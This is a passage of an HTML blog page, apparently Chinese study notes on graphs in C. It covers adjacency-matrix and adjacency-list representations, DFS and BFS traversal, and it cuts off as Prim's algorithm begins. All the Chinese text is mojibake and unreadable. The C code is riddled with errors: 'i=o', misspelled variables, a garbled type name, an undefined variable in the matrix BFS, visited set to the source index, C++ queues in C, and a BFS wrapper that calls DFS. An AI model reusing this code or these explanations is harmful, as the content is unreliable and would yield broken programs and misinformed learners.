href="#é‚»æ¥çŸ©é˜µè¡¨ç¤ºæ³•" class="headerlink" title="é‚»æ¥çŸ©é˜µè¡¨ç¤ºæ³•"></a>é‚»æ¥çŸ©é˜µè¡¨ç¤ºæ³•</h3><p>ä¸¾ä¾‹ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216201328.png"></p><ul><li>é‚»æ¥çŸ©é˜µå›¾çš„ç±»å‹å®šä¹‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GRAPHMATRIX_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> size;<span class="comment">//å›¾ä¸­ç»“ç‚¹çš„ä¸ªæ•°</span></span><br><span class="line">    <span class="type">int</span> **graph;<span class="comment">//äºŒç»´æ•°ç»„ä¿å­˜å›¾</span></span><br><span class="line">&#125;GraphMatrix;</span><br></pre></td></tr></table></figure><ul><li>åˆå§‹åŒ–å›¾ï¼ˆé‚»æ¥çŸ©é˜µï¼‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">GraphMatrix* <span class="title function_">InitGraph</span><span class="params">(<span class="type">int</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i,j;</span><br><span class="line">    GraphMatrix* graphMatrix = (GraphMatrix*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GraphMatrix));</span><br><span class="line">    graphMatrix-&gt;size = num;<span class="comment">//å›¾ä¸­ç»“ç‚¹ä¸ªæ•°</span></span><br><span class="line">    <span class="comment">//ç»™å›¾åˆ†é…ç©ºé—´</span></span><br><span class="line">    graphMatrix-&gt;graph = (<span class="type">int</span>**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>*)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="keyword">for</span>(i=o;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">        graphMatrix-&gt;graph[i]=(<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)*graphMatrix-&gt;size);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">            graphMatrix-&gt;graph[i][j] = INT_MAX;<span class="comment">//åˆå§‹è®¾ç½®æ‰€æœ‰é¡¶ç‚¹ä¸é‚»æ¥</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> graphMatrix;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>ä¸ºä»€ä¹ˆè¦ç”³è¯·ä¸¤æ¬¡ç©ºé—´ï¼Ÿ</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216230949.png"></p><ul><li>è¾“å…¥é‚»æ¥çŸ©é˜µå›¾ç®—æ³•ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ReadGraph</span><span class="params">(GraphMatrix* graphMatrix)</span><span class="comment">//è¾“å…¥è¾¹ä¿¡æ¯æ„å»ºå›¾</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> vex1,vex2,weight;</span><br><span class="line">    <span class="comment">//è¾“å…¥æ–¹å¼æ˜¯ç‚¹ ç‚¹ æƒå€¼ï¼Œæƒå€¼ä¸º0ï¼Œåˆ™è¾“å…¥ç»“æŸ</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ï¼Œè¾“å…¥æ–¹å¼ä¸ºç‚¹ ç‚¹ æƒå€¼ï¼Œæƒå€¼ä¸º0ï¼Œåˆ™è¾“å…¥ç»“æŸ\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d%d%d&quot;</span>,&amp;vex1,&amp;vex2,&amp;weight);</span><br><span class="line">    <span class="keyword">while</span>(weight!=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        graphMatrix-&gt;graph[vex1][vex2] = weight;</span><br><span class="line">        scanf_s(<span class="string">&quot;%d%d%d&quot;</span>,&amp;vex1,&amp;vex2,&amp;weight);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é‚»æ¥è¡¨è¡¨ç¤ºæ³•"><a href="#é‚»æ¥è¡¨è¡¨ç¤ºæ³•" class="headerlink" title="é‚»æ¥è¡¨è¡¨ç¤ºæ³•"></a>é‚»æ¥è¡¨è¡¨ç¤ºæ³•</h3><p>ä¸¾ä¾‹ï¼š</p><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216202227.png"></p><ul><li>å®¹æ˜“ç¡®å®šå›¾çš„é¡¶ç‚¹æ•°å’Œåˆ¤æ–­ä¸€ä¸ªé¡¶ç‚¹ä¸å“ªå‡ ä¸ªé¡¶ç‚¹æ˜¯å¦æœ‰è¾¹ç›¸è¿</li><li>å®¹æ˜“ç¡®å®šå›¾çš„é¡¶ç‚¹çš„åº¦ï¼Œå³é¡¶ç‚¹å¯¹åº”é¡ºåºè¡¨çš„é“¾è¡¨é“¾æ¥çš„ç»“ç‚¹ä¸ªæ•°</li></ul><p><img src="https://aimerl0-1303178350.cos.ap-guangzhou.myqcloud.com/img/20201216204631.png"></p><ul><li>é‚»æ¥è¡¨å›¾çš„ç±»å‹å®šä¹‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GRAPHLISTNODE_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> nodeno;<span class="comment">//å›¾ä¸­ç»“ç‚¹ç¼–å·</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">GRAPHLISTNODE_STRU</span>* <span class="title">next</span>;</span><span class="comment">//æŒ‡å‘ä¸‹ä¸€ä¸ªç»“ç‚¹çš„æŒ‡é’ˆ</span></span><br><span class="line">&#125;GraphListNode;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">GRAPHLIST_STRU</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> size;<span class="comment">//å›¾ä¸­ç»“ç‚¹ä¸ªæ•°</span></span><br><span class="line">    GraphListNode* graphListArray;<span class="comment">//å›¾çš„é‚»æ¥è¡¨ï¼Œç”¨äºŒç»´æ•°ç»„è¡¨ç¤º</span></span><br><span class="line">&#125;GraphList;</span><br></pre></td></tr></table></figure><ul><li>åˆå§‹åŒ–å›¾ï¼ˆé‚»æ¥è¡¨ï¼‰</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">GraphList* <span class="title function_">IniGraph</span><span class="params">(<span class="type">int</span> num)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;</span><br><span class="line">    GraphList *grahList = (GraphList*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GraphList));</span><br><span class="line">    grapList-&gt;size = num;</span><br><span class="line">    graphList-&gt;graphListArray = (GraphListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GraphListNode)*num);</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;num;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        graphList-&gt;graphListArray[i].next = <span class="literal">NULL</span>;</span><br><span class="line">        graphList-&gt;graphListArray[i].nodeno = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> grapList;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>è¾“å…¥é‚»æ¥çŸ©é˜µå›¾ç®—æ³•ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">ReadGraph</span><span class="params">(GraphList* graphList)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> vex1,vex2;</span><br><span class="line">    GraphListNode *tempNode = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="comment">//è¾“å…¥æ–¹å¼ä¸ºç‚¹ ç‚¹ï¼Œç‚¹ä¸º-1ï¼Œåˆ™è¾“å…¥ç»“æŸ</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;è¯·è¾“å…¥ï¼Œè¾“å…¥æ–¹å¼ä¸ºç‚¹ ç‚¹ï¼Œç‚¹ä¸º-1ï¼Œåˆ™è¾“å…¥ç»“æŸ\n&quot;</span>);</span><br><span class="line">    scanf_s(<span class="string">&quot;%d%d&quot;</span>,&amp;vex1,&amp;vex2);</span><br><span class="line">    <span class="keyword">while</span>(vex1&gt;=<span class="number">0</span> &amp;&amp; vex2&gt;=<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        tempNode = (GraphListNode*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(GraphListNode));</span><br><span class="line">        tempNode-&gt;nodeno = vex2;</span><br><span class="line">        tempNode-&gt;next = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//å¤´æ’æ³•æ’å…¥ç»“ç‚¹</span></span><br><span class="line">        tempNode-&gt;next = graphList-&gt;graphListArray[vex1].next;</span><br><span class="line">        graphList-&gt;graphListArray[vex1].next = tempNode;</span><br><span class="line">        scanf_s(<span class="string">&quot;%d%d&quot;</span>,&amp;vex1,&amp;vex2);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="é‚»æ¥å¤šé‡è¡¨è¡¨ç¤ºæ³•"><a href="#é‚»æ¥å¤šé‡è¡¨è¡¨ç¤ºæ³•" class="headerlink" title="é‚»æ¥å¤šé‡è¡¨è¡¨ç¤ºæ³•"></a>é‚»æ¥å¤šé‡è¡¨è¡¨ç¤ºæ³•</h3><h3 id="å›¾çš„åå­—é“¾è¡¨"><a href="#å›¾çš„åå­—é“¾è¡¨" class="headerlink" title="å›¾çš„åå­—é“¾è¡¨"></a>å›¾çš„åå­—é“¾è¡¨</h3><blockquote><p>ä»¥åæœ‰ç©ºè¡¥ä¸Š</p></blockquote><h2 id="å›¾çš„å‘¨æ¸¸"><a href="#å›¾çš„å‘¨æ¸¸" class="headerlink" title="å›¾çš„å‘¨æ¸¸"></a>å›¾çš„å‘¨æ¸¸</h2><ul><li>éå†æ¯ä¸ªé¡¶ç‚¹ï¼Œä¸é‡å¤</li></ul><h3 id="æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"><a href="#æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰" class="headerlink" title="æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰"></a>æ·±åº¦ä¼˜å…ˆæœç´¢ï¼ˆDFSï¼‰</h3><ul><li>æŒ‡å®šé¡¶ç‚¹<code>v</code>å‡ºå‘ï¼Œå…ˆè®¿é—®é¡¶ç‚¹<code>v</code>ï¼Œå¹¶<code>å°†å…¶æ ‡è®°</code></li><li>å¦‚æœå­˜åœ¨ä¸<code>v</code>é‚»æ¥é¡¶ç‚¹æ²¡è¢«è®¿é—®è¿‡ï¼Œåˆ™é€‰æ‹©å…¶ä¸­çš„ä¸€ä¸ª<code>w</code>å‡ºå‘è¿›è¡Œ<code>DFS(w)</code></li><li>å¦åˆ™ï¼Œè¿”å›</li><li><code>å¦‚æœå›¾ä¸­æœ‰æœªè¢«è®¿é—®çš„é¡¶ç‚¹ï¼Œåˆ™ä»å¦ä¸€æœªè¢«è®¿é—®çš„é¡¶ç‚¹å‡ºå‘é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°éå†å…¨éƒ¨é¡¶ç‚¹</code></li><li>é‚»æ¥çŸ©é˜µ DFS ç®—æ³•å®ç°ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DFSGraphMatrix</span><span class="params">(GraphMatrix * graphMatrix)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;<span class="comment">//ç”¨äºè®°å½•å›¾ä¸­ç»“ç‚¹å“ªäº›è¢«è®¿é—®äº†</span></span><br><span class="line">    <span class="type">int</span> *visited = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)* graphMatrix-&gt;size);</span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–æ‰€æœ‰ç‚¹éƒ½æœªè¢«è®¿é—®</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphMatrix-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">            DFS(graphMatrix, visite, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(GraphMatrix* graphMatrix,<span class="type">int</span> *visited,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    visited[source] = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(graphMatrix-&gt;graph[source][j] != INT_MAX &amp;&amp; !visited[j])</span><br><span class="line">            DFS(graphMatrix,visited,j);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é‚»æ¥è¡¨ DFS ç®—æ³•å®ç°ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DFSGraphMatrix</span><span class="params">(GraphList * graphList)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;<span class="comment">//ç”¨äºè®°å½•å›¾ä¸­ç»“ç‚¹å“ªäº›è¢«è®¿é—®äº†</span></span><br><span class="line">    <span class="type">int</span> *visited = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)* graphList-&gt;size);</span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–æ‰€æœ‰ç‚¹éƒ½æœªè¢«è®¿é—®</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">            DFS(graphList, visite, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(GraphLIst* graphList, <span class="type">int</span>* visited,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j;</span><br><span class="line">    GraphListå¼„å¾—*tempnode = <span class="literal">NULL</span>;</span><br><span class="line">    visited[source] = <span class="number">1</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,source);</span><br><span class="line">    tempNode = graphList-&gt;graphListArray[source].next;</span><br><span class="line">    <span class="keyword">while</span>(tempNode != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[tempNode-&gt;nodeno])</span><br><span class="line">            DFS(graphList,visited,tempNode-&gt;nodeno);</span><br><span class="line">        tempNode = tempNode-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰"><a href="#å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰" class="headerlink" title="å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰"></a>å¹¿åº¦ä¼˜å…ˆæœç´¢ï¼ˆBFSï¼‰</h3><ul><li>æŒ‡å®šé¡¶ç‚¹<code>v</code>å‡ºå‘ï¼Œå…ˆè®¿é—®é¡¶ç‚¹<code>v</code>ï¼Œå¹¶<code>å°†å…¶æ ‡è®°</code></li><li>ä¾æ¬¡è®¿é—®<code>v</code>çš„æ‰€æœ‰ç›¸é‚»ç»“ç‚¹</li><li>å†ä¾æ¬¡è®¿é—®ä¸ç›¸é‚»ç»“ç‚¹é‚»æ¥çš„æ‰€æœ‰æ²¡è¢«è®¿é—®è¿‡çš„é¡¶ç‚¹</li><li>ç›´åˆ°æ‰€æœ‰å·²è®¿é—®é¡¶ç‚¹çš„ç›¸é‚»ç»“ç‚¹éƒ½è¢«è®¿é—®è¿‡ä¸ºæ­¢</li><li><code>å¦‚æœå›¾ä¸­æœ‰æœªè¢«è®¿é—®çš„é¡¶ç‚¹ï¼Œåˆ™ä»å¦ä¸€æœªè¢«è®¿é—®çš„é¡¶ç‚¹å‡ºå‘é‡å¤ä¸Šè¿°è¿‡ç¨‹ï¼Œç›´åˆ°éå†å…¨éƒ¨é¡¶ç‚¹</code></li><li>é‚»æ¥çŸ©é˜µ BFS ç®—æ³•å®ç°ï¼š</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BFSGraphMatrix</span><span class="params">(GraphMatrix * graphList)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;<span class="comment">//ç”¨äºè®°å½•å›¾ä¸­ç»“ç‚¹å“ªäº›è¢«è®¿é—®äº†</span></span><br><span class="line">    <span class="type">int</span> *visited = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)* graphList-&gt;size);</span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–æ‰€æœ‰ç‚¹éƒ½æœªè¢«è®¿é—®</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">            BFS(graphList, visite, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(GraphMatrix* graphMatrix,<span class="type">int</span>*visited,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> j,tempVex;</span><br><span class="line">    LinkQueue waitingQueue = <span class="literal">NULL</span>;</span><br><span class="line">    waitingQueue = SetNullQueue_Link();</span><br><span class="line"><span class="keyword">if</span>(!visited[i])<span class="comment">//å¦‚æœæ²¡è¢«è®¿é—®è¿‡</span></span><br><span class="line">    &#123;</span><br><span class="line">        visited[i] = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,i);</span><br><span class="line">        EnQueue_link(waitingQueue,i);<span class="comment">//å°†åˆšè®¿é—®ç»“ç‚¹æ”¾å…¥é˜Ÿåˆ—</span></span><br><span class="line">        <span class="keyword">while</span>(!IsNullQueue_Link(waitingQueue))</span><br><span class="line">        &#123;</span><br><span class="line">            tempVex = FrontQueue_link(waitingQueue);</span><br><span class="line">            DeQueue_link(waitingQueue);</span><br><span class="line">            <span class="keyword">for</span>(j=<span class="number">0</span>;j&lt;graphMatrix-&gt;size;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">//å¦‚æœå…¶ä»–é¡¶ç‚¹ä¸å½“å‰é¡¶ç‚¹å­˜åœ¨è¾¹ä¸”æœªè®¿é—®è¿‡</span></span><br><span class="line">                <span class="keyword">if</span>(graphMatrix-&gt;graph[tempVex][j] != INT_MAX &amp;&amp; !visited[j])</span><br><span class="line">                &#123;</span><br><span class="line">                    visited[j] = source;<span class="comment">//æ ‡è®°</span></span><br><span class="line">                    EnQueue_link(waitingQueue,j);<span class="comment">//å…¥é˜Ÿ</span></span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,j);<span class="comment">//è¾“å‡º</span></span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>é‚»æ¥è¡¨ BFS ç®—æ³•å®ç°</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">BFSGraphMatrix</span><span class="params">(GraphList * graphList)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i;<span class="comment">//ç”¨äºè®°å½•å›¾ä¸­ç»“ç‚¹å“ªäº›è¢«è®¿é—®äº†</span></span><br><span class="line">    <span class="type">int</span> *visited = (<span class="type">int</span>*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="type">int</span>)* graphList-&gt;size);</span><br><span class="line">    <span class="comment">//åˆå§‹åŒ–æ‰€æœ‰ç‚¹éƒ½æœªè¢«è®¿é—®</span></span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">        visited[i] = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;graphList-&gt;size;i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(!visited[i])</span><br><span class="line">            DFS(graphList, visite, i);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">void</span> <span class="title function_">BFS</span><span class="params">(GraphList* graphList,<span class="type">int</span>* visited,<span class="type">int</span> source)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> tempVex;</span><br><span class="line">    GraphListNode *tempNode = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="built_in">queue</span>&lt;<span class="type">int</span>&gt; waitingQueue;<span class="comment">//å¹¿åº¦ä¼˜å…ˆéå†ä½¿ç”¨çš„é˜Ÿåˆ—æ˜¯c++çš„STLä¸­çš„queue</span></span><br><span class="line">    <span class="keyword">if</span>(!visited[source])</span><br><span class="line">    &#123;</span><br><span class="line">        visited[source] = <span class="number">1</span>;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,source);</span><br><span class="line">        waitingQueue.push(source);<span class="comment">//åˆšåˆšè®¿é—®ç»“ç‚¹æ”¾å…¥é˜Ÿåˆ—</span></span><br><span class="line">        <span class="keyword">while</span>(!waitingQueue.empty())</span><br><span class="line">        &#123;</span><br><span class="line">            tempVex = waitingQueue.front();</span><br><span class="line">            waitingQueue.pop();</span><br><span class="line">            tempNode = graphList-&gt;graphListArray[tempVex].next;</span><br><span class="line">            <span class="keyword">while</span>(tempNode != <span class="literal">NULL</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>(!visited[tempNode-&gt;nodeno])</span><br><span class="line">                &#123;</span><br><span class="line">                    visited[tempNode-&gt;nodeno] = <span class="number">1</span>;</span><br><span class="line">                    waitingQueue.push(tempNode-&gt;nodeno);</span><br><span class="line">                    <span class="built_in">printf</span>(<span class="string">&quot;%d&quot;</span>,tempNode-&gt;nodeno);</span><br><span class="line">                &#125;</span><br><span class="line">                tempNode = tempNode-&gt;next;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="æœ€å°ç”Ÿæˆæ ‘ï¼ˆMSTï¼‰"><a href="#æœ€å°ç”Ÿæˆæ ‘ï¼ˆMSTï¼‰" class="headerlink" title="æœ€å°ç”Ÿæˆæ ‘ï¼ˆMSTï¼‰"></a>æœ€å°ç”Ÿæˆæ ‘ï¼ˆMSTï¼‰</h2><h3 id="Primç®—æ³•"><a href="#Primç®—æ³•" class="headerlink" title="Primç®—æ³•"></a>Primç®—æ³•</h3><ul><li><p>ç®—æ³•æ€è·¯ï¼šæ¯æ¬¡é€‰æ‹©ä¸€æ¡æƒå€¼æœ€å°çš„è¾¹åŠå…¶ç›¸åº”çš„é¡¶ç‚¹åŠ å…¥æœ€å°ç”Ÿæˆæ 